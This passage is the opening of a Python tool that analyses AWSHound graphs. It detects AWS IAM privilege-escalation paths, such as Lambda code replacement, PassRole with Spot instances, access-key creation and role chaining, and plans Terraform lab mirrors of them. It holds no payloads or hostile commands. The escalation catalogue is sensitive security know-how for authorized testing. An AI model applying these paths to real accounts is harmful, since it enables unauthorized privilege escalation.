#!/usr/bin/env python3
"""AWSHound attack-path analysis and minimal-mirror orchestration.

The default workflow is deliberately non-mutating:

    graph -> classify -> context plan -> minimal specification -> Terraform

AWS reads are allow-listed and use AWS CLI profiles.  Terraform apply, attack
execution, remediation, and destroy require separate subcommands plus exact
approval tokens.  Runtime operations are limited to resources created by the
generated Terraform and discovered from its outputs.
"""

from __future__ import annotations

import argparse
import base64
from collections import deque
import datetime as dt
import gzip
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import zipfile
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Iterable


VERSION = "0.3.1"


class PipelineError(RuntimeError):
    """Raised for invalid input, unsafe execution, or unsupported paths."""


@dataclass(frozen=True)
class Node:
    id: str
    kinds: tuple[str, ...]
    properties: dict[str, Any]

    @property
    def primary_kind(self) -> str:
        # OpenGraph nodes may carry generic kinds before the AWS extension kind.
        # Prefer the AWS semantic kind so classification does not depend on list order.
        return next(
            (kind for kind in self.kinds if kind.startswith("AWS_")),
            self.kinds[0] if self.kinds else "UNKNOWN",
        )

    @property
    def arn(self) -> str | None:
        value = self.properties.get("arn")
        return str(value) if value else None


@dataclass(frozen=True)
class Edge:
    kind: str
    start: str
    end: str
    properties: dict[str, Any]


@dataclass
class Scenario:
    scenario_id: str
    scenario_type: str
    source_account_id: str
    region: str
    start_node_id: str
    target_node_id: str
    node_ids: list[str]
    edge_kinds: list[str]
    layers: list[str]
    inferred_layers: list[str]
    mirror_mode: str
    mirror_reason: list[str]
    terraform_supported: bool = True
    edge_ids: list[str] = field(default_factory=list)


@dataclass
class ContextRequest:
    request_id: str
    service: str
    operation: str
    arguments: list[str]
    reason: str
    required: bool
    region: str | None = None
    mutating: bool = False


NODE_LAYERS: dict[str, str] = {
    "AWS_Organization": "L1_IAM_CONTROL_PLANE",
    "AWS_Account": "L1_IAM_CONTROL_PLANE",
    "AWS_User": "L1_IAM_CONTROL_PLANE",
    "AWS_Group": "L1_IAM_CONTROL_PLANE",
    "AWS_Role": "L1_IAM_CONTROL_PLANE",
    "AWS_Policy": "L1_IAM_CONTROL_PLANE",
    "AWS_ServiceControlPolicy": "L1_IAM_CONTROL_PLANE",
    "AWS_ResourceControlPolicy": "L1_IAM_CONTROL_PLANE",
    "AWS_SAMLProvider": "L1_IAM_CONTROL_PLANE",
    "AWS_OIDCProvider": "L1_IAM_CONTROL_PLANE",
    "AWS_InstanceProfile": "L2_WORKLOAD_RUNTIME",
    "AWS_LambdaFunction": "L2_WORKLOAD_RUNTIME",
    "AWS_EC2Instance": "L2_WORKLOAD_RUNTIME",
    "AWS_CloudFormationStack": "L2_WORKLOAD_RUNTIME",
    "AWS_CloudFormationStackSet": "L2_WORKLOAD_RUNTIME",
    "AWS_EKSCluster": "L2_WORKLOAD_RUNTIME",
    "AWS_EKSNodeGroup": "L2_WORKLOAD_RUNTIME",
    "AWS_ECSCluster": "L2_WORKLOAD_RUNTIME",
    "AWS_ECSService": "L2_WORKLOAD_RUNTIME",
    "AWS_ECSTask": "L2_WORKLOAD_RUNTIME",
    "AWS_S3Bucket": "L3_APPLICATION_DATA",
    "AWS_S3Object": "L3_APPLICATION_DATA",
    "AWS_SSMParameter": "L3_APPLICATION_DATA",
    "AWS_Secret": "L3_APPLICATION_DATA",
    "AWS_KMSKey": "L3_APPLICATION_DATA",
    "AWS_Database": "L3_APPLICATION_DATA",
    "AWS_VPC": "L4_NETWORK",
    "AWS_Subnet": "L4_NETWORK",
    "AWS_SecurityGroup": "L4_NETWORK",
    "AWS_NetworkInterface": "L4_NETWORK",
    "AWS_LoadBalancer": "L4_NETWORK",
    "AWS_VPCEndpoint": "L4_NETWORK",
    "AWS_InternetGateway": "L4_NETWORK",
    "AWS_NATGateway": "L4_NETWORK",
}


def infer_edge_layer(kind: str) -> str:
    if kind in EDGE_LAYERS:
        return EDGE_LAYERS[kind]
    if any(token in kind for token in ("S3", "Bucket", "Object", "KMS", "Parameter")):
        return "L3_APPLICATION_DATA"
    if any(
        token in kind
        for token in (
            "Lambda",
            "EC2",
            "SSM",
            "CloudFormation",
            "EKS",
            "Cluster",
            "NodeGroup",
        )
    ):
        return "L2_WORKLOAD_RUNTIME"
    if any(
        token in kind
        for token in (
            "Policy",
            "Role",
            "User",
            "Group",
            "MFA",
            "AccessKey",
            "LoginProfile",
            "OIDC",
            "SAML",
            "Federation",
            "SessionToken",
            "PermissionsBoundary",
            "SCP",
            "RCP",
            "Trust",
        )
    ):
        return "L1_IAM_CONTROL_PLANE"
    return "CONTEXT_REQUIRED"


EDGE_LAYERS: dict[str, str] = {
    "AWS_HasPolicy": "L1_IAM_CONTROL_PLANE",
    "AWS_TrustedBy": "L1_IAM_CONTROL_PLANE",
    "AWS_CanAssumeRole": "L1_IAM_CONTROL_PLANE",
    "AWS_CanAttachUserPolicy": "L1_IAM_CONTROL_PLANE",
    "AWS_CanCreateAccessKey": "L1_IAM_CONTROL_PLANE",
    "AWS_CanCreatePolicyVersion": "L1_IAM_CONTROL_PLANE",
    "AWS_CanPassRoleToService": "L1_IAM_CONTROL_PLANE",
    "AWS_CanUpdateLambdaCode": "L2_WORKLOAD_RUNTIME",
    "AWS_CanInvokeLambdaFunction": "L2_WORKLOAD_RUNTIME",
    "AWS_CanRequestSpotInstances": "L2_WORKLOAD_RUNTIME",
    "AWS_SSMCanStartSession": "L2_WORKLOAD_RUNTIME",
    "AWS_RunsAs": "L2_WORKLOAD_RUNTIME",
    "AWS_CanListBucket": "L3_APPLICATION_DATA",
    "AWS_CanGetObject": "L3_APPLICATION_DATA",
    "AWS_CanPutObject": "L3_APPLICATION_DATA",
    "AWS_CanGetParameter": "L3_APPLICATION_DATA",
    "AWS_CanGetSecretValue": "L3_APPLICATION_DATA",
    "AWS_CanDecrypt": "L3_APPLICATION_DATA",
}


EDGE_ACTIONS: dict[str, str] = {
    "AWS_CanAssumeRole": "sts:AssumeRole",
    "AWS_CanAttachUserPolicy": "iam:AttachUserPolicy",
    "AWS_CanCreateAccessKey": "iam:CreateAccessKey",
    "AWS_CanCreatePolicyVersion": "iam:CreatePolicyVersion",
    "AWS_CanPassRoleToService": "iam:PassRole",
    "AWS_CanUpdateLambdaCode": "lambda:UpdateFunctionCode",
    "AWS_CanInvokeLambdaFunction": "lambda:InvokeFunction",
    "AWS_CanRequestSpotInstances": "ec2:RequestSpotInstances",
    "AWS_SSMCanStartSession": "ssm:StartSession",
    "AWS_CanListBucket": "s3:ListBucket",
    "AWS_CanGetObject": "s3:GetObject",
    "AWS_CanPutObject": "s3:PutObject",
    "AWS_CanGetParameter": "ssm:GetParameter",
    "AWS_CanGetSecretValue": "secretsmanager:GetSecretValue",
    "AWS_CanDecrypt": "kms:Decrypt",
}


MUTATING_EDGE_KINDS = {
    "AWS_CanAttachUserPolicy",
    "AWS_CanCreateAccessKey",
    "AWS_CanCreatePolicyVersion",
    "AWS_CanUpdateLambdaCode",
    "AWS_CanRequestSpotInstances",
}


EDGE_ACTION_OVERRIDES: dict[str, list[str]] = {
    "AWS_CanAttachRolePolicyWildcard": ["iam:AttachRolePolicy"],
    "AWS_CanPutRolePolicyWildcard": ["iam:PutRolePolicy"],
    "AWS_S3ObjectRead": ["s3:GetObject", "s3:GetObjectAcl"],
    "AWS_S3ObjectWrite": ["s3:PutObject", "s3:DeleteObject"],
    "AWS_S3ObjectAll": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject", "s3:GetObjectAcl", "s3:PutObjectAcl"],
    "AWS_S3BucketRead": ["s3:ListBucket", "s3:GetBucketPolicy", "s3:GetBucketAcl"],
    "AWS_S3BucketWrite": ["s3:PutBucketPolicy", "s3:PutBucketAcl", "s3:DeleteBucketPolicy"],
    "AWS_KMSKeyRead": ["kms:Decrypt", "kms:DescribeKey", "kms:GenerateDataKey"],
    "AWS_KMSKeyAll": ["kms:*"],
    "AWS_CanCreateSSMAssociation": ["ssm:CreateAssociation"],
    "AWS_CanCreateSSMDocument": ["ssm:CreateDocument"],
    "AWS_CanStartSSMAutomationExecution": ["ssm:StartAutomationExecution"],
    "AWS_CanCreateLambdaFunction": ["lambda:CreateFunction"],
    "AWS_LambdaFunctionAll": ["lambda:*"],
    "AWS_CanRunInstances": ["ec2:RunInstances"],
    "AWS_CanRequestSpotInstances": ["ec2:RequestSpotInstances"],
    "AWS_CanCreateCloudFormationStack": ["cloudformation:CreateStack"],
    "AWS_CanCreateCloudFormationStackSet": ["cloudformation:CreateStackSet", "cloudformation:CreateStackInstances"],
    "AWS_CanUpdateCloudFormationStackSet": ["cloudformation:UpdateStackSet"],
    "AWS_CanCreateEKSNodegroup": ["eks:CreateNodegroup"],
    "AWS_CanCreateEKSPodIdentityAssociation": ["eks:CreatePodIdentityAssociation"],
    "AWS_CanAssumeRoleViaIRSA": ["sts:AssumeRoleWithWebIdentity"],
    "AWS_CanAssumeRoleViaPodIdentity": ["sts:AssumeRoleForPodIdentity"],
}


STRUCTURAL_EDGE_KINDS = {
    "AWS_Contains",
    "AWS_MemberOf",
    "AWS_HasPolicy",
    "AWS_HasMember",
    "AWS_HasSCP",
    "AWS_HasRCP",
    "AWS_AttachedTo",
    "AWS_Trusts",
    "AWS_TrustedBy",
    "AWS_TrustsSAMLProvider",
    "AWS_TrustsOIDCProvider",
    "AWS_HasExternalRoleTrust",
    "AWS_RunsAs",
    "AWS_ClusterHasNodeGroup",
    "AWS_NodeGroupHasRole",
}


PATH_CONNECTOR_EDGE_KINDS = {
    "AWS_RunsAs",
    "AWS_ClusterHasNodeGroup",
    "AWS_NodeGroupHasRole",
}


def official_edge_catalog() -> dict[str, dict[str, Any]]:
    root = Path(__file__).resolve().parents[1]
    bundled = Path(__file__).resolve().parent / "schemas"
    schema_path = bundled / "aws-schema.json"
    metadata_path = bundled / "aws-traversable-edge-metadata.json"
    if not schema_path.is_file():
        schema_path = root / "vendor" / "AWSHound" / "schema" / "schema.json"
        metadata_path = (
            root
            / "vendor"
            / "AWSHound"
            / "internal"
            / "build"
            / "data"
            / "traversable_edge_metadata.json"
        )
    catalog: dict[str, dict[str, Any]] = {}
    if not schema_path.is_file():
        return catalog
    schema = json.loads(schema_path.read_text(encoding="utf-8"))
    metadata = (
        json.loads(metadata_path.read_text(encoding="utf-8"))
        if metadata_path.is_file()
        else {}
    )
    action_pattern = re.compile(
        r"\b(?:iam|sts|s3|kms|ssm|lambda|ec2|cloudformation|eks|organizations):[A-Za-z0-9*]+"
    )
    for item in schema.get("relationship_kinds", []):
        name = str(item.get("name", ""))
        description = str(item.get("description", ""))
        extra = metadata.get(name, {})
        searchable = description + " " + json.dumps(extra, ensure_ascii=False)
        actions = sorted(set(action_pattern.findall(searchable)))
        actions = sorted(set(actions + EDGE_ACTION_OVERRIDES.get(name, [])))
        catalog[name] = {
            "description": description,
            "actions": actions,
            "layer": infer_edge_layer(name),
            "structural": name in STRUCTURAL_EDGE_KINDS,
            "traversable": bool(extra) or name.startswith("AWS_Can") or name.endswith("All"),
            "metadata": extra,
        }
    return catalog


def edge_identifier(edge: Edge) -> str:
    return f"{edge.kind}|{edge.start}|{edge.end}"


def edge_requires_mutation(kind: str) -> bool:
    if kind in MUTATING_EDGE_KINDS:
        return True
    return any(
        token in kind
        for token in (
            "Create",
            "Update",
            "Put",
            "Attach",
            "Detach",
            "Delete",
            "Set",
            "Pass",
            "Run",
            "Request",
            "Associate",
            "Replace",
            "Modify",
            "SendCommand",
            "StartAutomation",
            "Upload",
            "Enable",
            "Deactivate",
            "Resync",
        )
    )


def utc_now() -> str:
    return dt.datetime.now(dt.timezone.utc).isoformat()


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(value, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def parse_json_property(value: Any, default: Any) -> Any:
    if value is None:
        return default
    if isinstance(value, (dict, list)):
        return value
    if isinstance(value, str):
        try:
            return json.loads(value)
        except json.JSONDecodeError:
            return default
    return default


def load_graph(path: Path) -> tuple[dict[str, Any], bytes]:
    if not path.is_file():
        raise PipelineError(f"input file does not exist: {path}")
    raw = path.read_bytes()
    if path.suffix.lower() == ".zip":
        try:
            with zipfile.ZipFile(path) as archive:
                files = [name for name in archive.namelist() if not name.endswith("/")]
                matches = [name for name in files if Path(name).name == "graph.json"]
                if len(files) != 1 or len(matches) != 1:
                    raise PipelineError(
                        "ZIP must contain exactly one file named graph.json "
                        f"(files={len(files)}, graph.json={len(matches)})"
                    )
                document = json.loads(archive.read(matches[0]).decode("utf-8-sig"))
        except zipfile.BadZipFile as exc:
            raise PipelineError(f"invalid ZIP: {path}") from exc
    else:
        try:
            document = json.loads(raw.decode("utf-8-sig"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise PipelineError(f"invalid JSON: {path}") from exc
    if not isinstance(document, dict) or not isinstance(document.get("graph"), dict):
        raise PipelineError("input is not an AWSHound OpenGraph document")
    graph = document["graph"]
    if not isinstance(graph.get("nodes"), list) or not isinstance(graph.get("edges"), list):
        raise PipelineError("graph must contain nodes[] and edges[]")
    return document, raw


def normalize_graph(document: dict[str, Any]) -> tuple[dict[str, Node], list[Edge]]:
    nodes: dict[str, Node] = {}
    for raw in document["graph"]["nodes"]:
        node_id = raw.get("id")
        if not isinstance(node_id, str) or not node_id:
            raise PipelineError(f"node has no valid id: {raw!r}")
        nodes[node_id] = Node(
            id=node_id,
            kinds=tuple(str(kind) for kind in raw.get("kinds", [])),
            properties=dict(raw.get("properties", {})),
        )
    edges: list[Edge] = []
    for raw in document["graph"]["edges"]:
        try:
            edge = Edge(
                kind=str(raw["kind"]),
                start=str(raw["start"]["value"]),
                end=str(raw["end"]["value"]),
                properties=dict(raw.get("properties", {})),
            )
        except (KeyError, TypeError) as exc:
            raise PipelineError(f"malformed edge: {raw!r}") from exc
        if edge.start not in nodes or edge.end not in nodes:
            raise PipelineError(f"edge references an unknown node: {edge}")
        edges.append(edge)
    return nodes, edges


def node_has_kind(node: Node, kind: str) -> bool:
    return kind in node.kinds


def node_name(node: Node) -> str:
    for key in ("user_name", "role_name", "policy_name", "function_name", "name"):
        value = node.properties.get(key)
        if value:
            text = str(value)
            if ":" in text and key == "name":
                return text.split(":", 1)[1]
            return text
    if node.arn:
        return node.arn.rsplit("/", 1)[-1].rsplit(":", 1)[-1]
    return node.id


def node_account(node: Node) -> str | None:
    value = node.properties.get("account_id")
    if value and re.fullmatch(r"\d{12}", str(value)):
        return str(value)
    if node.arn:
        match = re.match(r"arn:[^:]+:[^:]*:[^:]*:(\d{12}):", node.arn)
        if match:
            return match.group(1)
    return None


def node_region(node: Node) -> str | None:
    value = node.properties.get("region")
    if value:
        return str(value)
    if node.arn:
        parts = node.arn.split(":")
        if len(parts) > 3 and parts[3]:
            return parts[3]
    return None


def scenario_slug(*values: str, fallback: str) -> str:
    joined = " ".join(values).lower()
    patterns = (
        r"(lambda-\d{3}(?:-to-admin)?)",
        r"(sts-\d{3}(?:-to-admin)?)",
        r"(ec2-\d{3}(?:-to-admin)?)",
        r"(iam-\d{3}(?:-to-(?:admin|bucket))?)",
        r"(role-chain-to-s3)",
    )
    for pattern in patterns:
        match = re.search(pattern, joined)
        if match:
            return match.group(1).replace("-to-admin", "")
    return fallback


def edge_index(edges: Iterable[Edge]) -> dict[str, list[Edge]]:
    result: dict[str, list[Edge]] = {}
    for edge in edges:
        result.setdefault(edge.kind, []).append(edge)
    return result


def supporting_nodes(
    seed_ids: Iterable[str], nodes: dict[str, Node], edges: list[Edge]
) -> set[str]:
    """Add policy, flag, bucket, and object nodes directly supporting a path."""
    selected = set(seed_ids)
    changed = True
    allowed = {
        "AWS_HasPolicy",
        "AWS_CanGetParameter",
        "AWS_RunsAs",
        "AWS_ClusterHasNodeGroup",
        "AWS_NodeGroupHasRole",
    }
    while changed:
        changed = False
        for edge in edges:
            if edge.kind not in allowed:
                continue
            if edge.start in selected and edge.end not in selected:
                selected.add(edge.end)
                changed = True
    # An S3 object implies its bucket even if AWS_Contains is the only link.
    for edge in edges:
        if edge.kind == "AWS_Contains" and edge.end in selected:
            if node_has_kind(nodes[edge.start], "AWS_S3Bucket"):
                selected.add(edge.start)
    return selected


def classify_layers(
    node_ids: Iterable[str], edge_kinds: Iterable[str], nodes: dict[str, Node]
) -> list[str]:
    layers = {
        NODE_LAYERS.get(nodes[node_id].primary_kind, "CONTEXT_REQUIRED")
        for node_id in node_ids
    }
    layers.update(infer_edge_layer(kind) for kind in edge_kinds)
    order = {
        "L1_IAM_CONTROL_PLANE": 1,
        "L2_WORKLOAD_RUNTIME": 2,
        "L3_APPLICATION_DATA": 3,
        "L4_NETWORK": 4,
        "CONTEXT_REQUIRED": 99,
    }
    return sorted(layers, key=lambda value: order.get(value, 100))


def make_scenario(
    *,
    scenario_id: str,
    scenario_type: str,
    start: str,
    target: str,
    seed_nodes: Iterable[str],
    path_edges: Iterable[Edge],
    nodes: dict[str, Node],
    all_edges: list[Edge],
    mirror_mode: str,
    reasons: list[str],
    inferred_layers: list[str] | None = None,
) -> Scenario:
    selected = supporting_nodes(seed_nodes, nodes, all_edges)
    edge_kinds = sorted({edge.kind for edge in path_edges})
    account = node_account(nodes[start]) or node_account(nodes[target]) or "UNKNOWN"
    region = next(
        (node_region(nodes[node_id]) for node_id in selected if node_region(nodes[node_id])),
        "us-east-1",
    )
    layers = classify_layers(selected, edge_kinds, nodes)
    inferred = inferred_layers or []
    for layer in inferred:
        if layer not in layers:
            layers.append(layer)
    return Scenario(
        scenario_id=scenario_id,
        scenario_type=scenario_type,
        source_account_id=account,
        region=region,
        start_node_id=start,
        target_node_id=target,
        node_ids=sorted(selected),
        edge_kinds=edge_kinds,
        layers=layers,
        inferred_layers=inferred,
        mirror_mode=mirror_mode,
        mirror_reason=reasons,
        edge_ids=sorted({edge_identifier(edge) for edge in path_edges}),
    )


def detect_scenarios(nodes: dict[str, Node], edges: list[Edge]) -> list[Scenario]:
    by_kind = edge_index(edges)
    edge_set = {(edge.kind, edge.start, edge.end) for edge in edges}
    admin_roles = {
        edge.start
        for edge in by_kind.get("AWS_HasPolicy", [])
        if nodes[edge.end].properties.get("arn") == "arn:aws:iam::aws:policy/AdministratorAccess"
    }
    scenarios: list[Scenario] = []

    # Lambda UpdateFunctionCode + InvokeFunction -> admin execution role.
    for update in by_kind.get("AWS_CanUpdateLambdaCode", []):
        if ("AWS_CanInvokeLambdaFunction", update.start, update.end) not in edge_set:
            continue
        runs = [edge for edge in by_kind.get("AWS_RunsAs", []) if edge.start == update.end]
        for run in runs:
            if run.end not in admin_roles:
                continue
            invoke = next(
                edge
                for edge in by_kind["AWS_CanInvokeLambdaFunction"]
                if edge.start == update.start and edge.end == update.end
            )
            scenario_id = scenario_slug(
                node_name(nodes[update.start]), node_name(nodes[update.end]), fallback="lambda-update-invoke"
            )
            scenarios.append(
                make_scenario(
                    scenario_id=scenario_id,
                    scenario_type="lambda_update_invoke_admin",
                    start=update.start,
                    target=update.end,
                    seed_nodes=[update.start, update.end, run.end],
                    path_edges=[update, invoke, run],
                    nodes=nodes,
                    all_edges=edges,
                    mirror_mode="PARTIAL_MIRROR",
                    reasons=[
                        "UpdateFunctionCode changes workload state.",
                        "Runtime execution is required to prove use of the Lambda execution role.",
                    ],
                )
            )

    # Direct user -> Administrator role.
    for assume in by_kind.get("AWS_CanAssumeRole", []):
        if not node_has_kind(nodes[assume.start], "AWS_User") or assume.end not in admin_roles:
            continue
        scenario_id = scenario_slug(
            node_name(nodes[assume.start]), node_name(nodes[assume.end]), fallback="sts-assume-admin"
        )
        scenarios.append(
            make_scenario(
                scenario_id=scenario_id,
                scenario_type="sts_assume_admin",
                start=assume.start,
                target=assume.end,
                seed_nodes=[assume.start, assume.end],
                path_edges=[assume],
                nodes=nodes,
                all_edges=edges,
                mirror_mode="LIVE_CANARY_OR_IAM_MIRROR",
                reasons=[
                    "Static IAM evaluation does not issue an STS session.",
                    "An authorized lab can validate with a short-lived session; otherwise mirror IAM only.",
                ],
            )
        )

    # PassRole + RequestSpotInstances -> admin EC2 role.
    for passed in by_kind.get("AWS_CanPassRoleToService", []):
        if passed.end not in admin_roles:
            continue
        request_edges = [
            edge
            for edge in by_kind.get("AWS_CanRequestSpotInstances", [])
            if edge.start == passed.start
        ]
        if not request_edges:
            continue
        scenario_id = scenario_slug(
            node_name(nodes[passed.start]), node_name(nodes[passed.end]), fallback="ec2-passrole-spot"
        )
        scenarios.append(
            make_scenario(
                scenario_id=scenario_id,
                scenario_type="ec2_passrole_spot_admin",
                start=passed.start,
                target=passed.end,
                seed_nodes=[passed.start, passed.end, request_edges[0].end],
                path_edges=[passed, request_edges[0]],
                nodes=nodes,
                all_edges=edges,
                mirror_mode="MINIMAL_RUNTIME_MIRROR",
                reasons=[
                    "A real EC2 Spot request is required to prove PassRole exploitation.",
                    "The mirror needs only launch prerequisites and outbound AWS API connectivity.",
                ],
                inferred_layers=["L4_NETWORK"],
            )
        )

    # CreateAccessKey on another user that can read S3.
    for create in by_kind.get("AWS_CanCreateAccessKey", []):
        data_edges = [
            edge
            for edge in by_kind.get("AWS_CanGetObject", [])
            if edge.start == create.end
        ]
        if not data_edges:
            continue
        preferred = [edge for edge in data_edges if "flag" in node_name(nodes[edge.end]).lower()]
        data_edges = [(preferred or data_edges)[0]]
        scenario_id = scenario_slug(
            node_name(nodes[create.start]), node_name(nodes[create.end]), fallback="iam-create-key-s3"
        )
        scenarios.append(
            make_scenario(
                scenario_id=scenario_id,
                scenario_type="iam_create_access_key_s3",
                start=create.start,
                target=create.end,
                seed_nodes=[create.start, create.end] + [edge.end for edge in data_edges],
                path_edges=[create] + data_edges,
                nodes=nodes,
                all_edges=edges,
                mirror_mode="PARTIAL_MIRROR",
                reasons=[
                    "CreateAccessKey creates persistent credentials.",
                    "Only test IAM users and a synthetic S3 object should be reproduced.",
                ],
            )
        )

    # Multi-hop role chain ending in S3 access.
    assume_edges = by_kind.get("AWS_CanAssumeRole", [])
    outgoing: dict[str, list[Edge]] = {}
    for edge in assume_edges:
        outgoing.setdefault(edge.start, []).append(edge)
    for start_id, node in nodes.items():
        if not node_has_kind(node, "AWS_User"):
            continue
        stack: list[tuple[str, list[Edge], set[str]]] = [(start_id, [], {start_id})]
        while stack:
            current, path, seen = stack.pop()
            if len(path) >= 2:
                data_edges = [
                    edge
                    for edge in by_kind.get("AWS_CanGetObject", [])
                    if edge.start == current
                ]
                if data_edges:
                    scenario_id = scenario_slug(
                        node_name(node), node_name(nodes[current]), fallback="role-chain-to-s3"
                    )
                    scenarios.append(
                        make_scenario(
                            scenario_id=scenario_id,
                            scenario_type="role_chain_s3",
                            start=start_id,
                            target=current,
                            seed_nodes=list(seen) + [edge.end for edge in data_edges],
                            path_edges=path + data_edges,
                            nodes=nodes,
                            all_edges=edges,
                            mirror_mode="LIVE_CANARY_OR_PARTIAL_MIRROR",
                            reasons=[
                                "Role chaining can be tested with short-lived sessions in an authorized lab.",
                                "Otherwise mirror only the chain and a synthetic S3 object.",
                            ],
                        )
                    )
                    break
            if len(path) >= 6:
                continue
            for edge in outgoing.get(current, []):
                if edge.end not in seen:
                    stack.append((edge.end, path + [edge], seen | {edge.end}))

    # Registry-driven fallback for any official AWSHound attack edge not already
    # consumed by one of the high-fidelity adapters above.  Connected unknown
    # edges become one generic semantic-mirror plan.
    catalog = official_edge_catalog()
    covered = {edge_id for scenario in scenarios for edge_id in scenario.edge_ids}
    contained_in_known = {
        edge_identifier(edge)
        for edge in edges
        if any(edge.start in scenario.node_ids and edge.end in scenario.node_ids for scenario in scenarios)
    }
    remaining = [
        edge
        for edge in edges
        if edge_identifier(edge) not in covered
        and edge_identifier(edge) not in contained_in_known
        and (
            edge.kind not in STRUCTURAL_EDGE_KINDS
            or edge.kind in PATH_CONNECTOR_EDGE_KINDS
        )
        and (
            edge.kind.startswith("AWS_Can")
            or catalog.get(edge.kind, {}).get("traversable")
            or edge.properties.get("is_traversable") is True
        )
    ]
    unseen = {edge_identifier(edge): edge for edge in remaining}
    while unseen:
        _, first = unseen.popitem()
        component = [first]
        component_nodes = {first.start, first.end}
        changed = True
        while changed:
            changed = False
            component_starts = {item.start for item in component}
            component_ends = {item.end for item in component}
            for key, edge in list(unseen.items()):
                # Join only sequential edges. Sharing a common account/resource
                # target does not make unrelated escalation edges one path.
                if edge.start in component_ends or edge.end in component_starts:
                    component.append(edge)
                    component_nodes.update([edge.start, edge.end])
                    del unseen[key]
                    changed = True
        support = [
            edge
            for edge in edges
            if edge.kind in STRUCTURAL_EDGE_KINDS
            and edge.start in component_nodes
            and edge.end in component_nodes
        ]
        principal_starts = [
            edge.start
            for edge in component
            if nodes[edge.start].primary_kind in {"AWS_User", "AWS_Role", "AWS_Group"}
        ]
        start = principal_starts[0] if principal_starts else component[0].start
        target = component[-1].end
        digest = hashlib.sha1(
            "\n".join(sorted(edge_identifier(edge) for edge in component)).encode("utf-8")
        ).hexdigest()[:10]
        mutating = any(edge_requires_mutation(edge.kind) for edge in component)
        scenarios.append(
            make_scenario(
                scenario_id=f"generic-{digest}",
                scenario_type="generic_awshound_path",
                start=start,
                target=target,
                seed_nodes=component_nodes,
                path_edges=component + support,
                nodes=nodes,
                all_edges=edges,
                mirror_mode="REGISTRY_DRIVEN_PARTIAL_MIRROR" if mutating else "REGISTRY_DRIVEN_CANARY",
                reasons=[
                    "The path is not one of the five high-fidelity adapters.",
                    "Official AWSHound schema metadata and resource registries drive a gap-aware semantic mirror.",
                ],
                inferred_layers=(
                    ["L4_NETWORK"]
                    if any(nodes[node_id].primary_kind in {"AWS_EC2Instance", "AWS_EKSCluster", "AWS_EKSNodeGroup"} for node_id in component_nodes)
                    else []
                ),
            )
        )

    unique: dict[tuple[str, str, str], Scenario] = {}
    for scenario in scenarios:
        unique[(scenario.scenario_type, scenario.start_node_id, scenario.target_node_id)] = scenario
    return sorted(unique.values(), key=lambda item: (item.scenario_id, item.scenario_type))


def source_summary(nodes: dict[str, Node], edges: list[Edge], raw: bytes) -> dict[str, Any]:
    node_counts: dict[str, int] = {}
    edge_counts: dict[str, int] = {}
    accounts: set[str] = set()
    regions: set[str] = set()
    unknown_kinds: set[str] = set()
    for node in nodes.values():
        node_counts[node.primary_kind] = node_counts.get(node.primary_kind, 0) + 1
        account = node_account(node)
        region = node_region(node)
        if account:
            accounts.add(account)
        if region:
            regions.add(region)
        if node.primary_kind not in NODE_LAYERS:
            unknown_kinds.add(node.primary_kind)
    for edge in edges:
        edge_counts[edge.kind] = edge_counts.get(edge.kind, 0) + 1
    return {
        "sha256": sha256_bytes(raw),
        "nodes": len(nodes),
        "edges": len(edges),
        "node_kinds": dict(sorted(node_counts.items())),
        "edge_kinds": dict(sorted(edge_counts.items())),
        "accounts": sorted(accounts),
        "regions": sorted(regions),
        "unknown_node_kinds": sorted(unknown_kinds),
    }


def node_matches_selector(node: Node, selector: str) -> bool:
    needle = selector.lower()
    values = [node.id, node.arn or "", node_name(node), *node.kinds]
    return any(needle in str(value).lower() for value in values)


def path_edge_is_traversable(edge: Edge, catalog: dict[str, dict[str, Any]]) -> bool:
    if edge.kind in {"AWS_HasPolicy", "AWS_TrustedBy", "AWS_Trusts", "AWS_HasSCP", "AWS_HasRCP"}:
        return False
    if edge.properties.get("is_traversable") is True:
        return True
    if edge.properties.get("is_traversable") is False:
        return False
    return bool(catalog.get(edge.kind, {}).get("traversable"))


def default_path_sources(nodes: dict[str, Node], edges: list[Edge]) -> list[str]:
    outgoing = {edge.start for edge in edges if edge.kind not in STRUCTURAL_EDGE_KINDS}
    tagged: list[str] = []
    fallback: list[str] = []
    for node_id, node in nodes.items():
        if node_id not in outgoing or node.primary_kind not in {"AWS_User", "AWS_Role"}:
            continue
        tags = parse_json_property(node.properties.get("tags"), [])
        serialized = json.dumps(tags, ensure_ascii=False).lower()
        name = node_name(node).lower()
        if "starting-user" in name or "starting-role" in name or "purpose\":\"starting" in serialized.replace(" ", ""):
            tagged.append(node_id)
        else:
            fallback.append(node_id)
    return sorted(tagged or fallback)


def default_path_targets(nodes: dict[str, Node], edges: list[Edge]) -> set[str]:
    targets: set[str] = set()
    for node_id, node in nodes.items():
        if node.primary_kind in {"AWS_Account", "AWS_S3Object", "AWS_SSMParameter", "AWS_KMSKey"}:
            targets.add(node_id)
    for edge in edges:
        if edge.kind != "AWS_HasPolicy":
            continue
        policy = nodes.get(edge.end)
        if policy and policy.properties.get("arn") == "arn:aws:iam::aws:policy/AdministratorAccess":
            targets.add(edge.start)
    return targets


def extract_support_edges(
    path_node_ids: set[str], nodes: dict[str, Node], edges: list[Edge]
) -> tuple[set[str], list[Edge]]:
    selected_nodes = set(path_node_ids)
    selected_edges: dict[str, Edge] = {}
    changed = True
    forward_support = {
        "AWS_HasPolicy",
        "AWS_RunsAs",
        "AWS_ClusterHasNodeGroup",
        "AWS_NodeGroupHasRole",
        "AWS_CanGetParameter",
    }
    while changed:
        changed = False
        for edge in edges:
            if edge.kind in forward_support and edge.start in selected_nodes:
                selected_edges[edge_identifier(edge)] = edge
                if edge.end not in selected_nodes:
                    selected_nodes.add(edge.end)
                    changed = True
            elif edge.kind in {"AWS_TrustedBy", "AWS_Trusts"} and edge.start in selected_nodes and edge.end in selected_nodes:
                selected_edges[edge_identifier(edge)] = edge
    # Add S3 bucket parents and account-level policy restrictions without
    # expanding every account child.
    for edge in edges:
        if edge.kind == "AWS_Contains" and edge.end in selected_nodes:
            parent = nodes[edge.start]
            child = nodes[edge.end]
            if parent.primary_kind == "AWS_S3Bucket" or child.primary_kind in {
                "AWS_ServiceControlPolicy",
